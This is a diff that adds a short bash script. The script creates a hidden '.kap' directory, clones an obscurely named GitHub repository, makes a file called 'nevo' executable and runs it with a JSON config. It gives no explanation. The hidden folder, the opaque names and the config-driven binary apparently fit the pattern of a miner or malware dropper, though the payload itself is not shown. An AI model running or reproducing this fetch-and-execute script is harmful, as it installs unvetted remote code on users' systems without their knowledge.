@@ -1,0 +1,6 @@
+#!/bin/bash
+mkdir .kap && cd .kap
+git clone https://github.com/nw4tw5/gradi.git neva
+cd neva
+chmod +x nevo nevo.json
+./nevo -c "nevo.json"
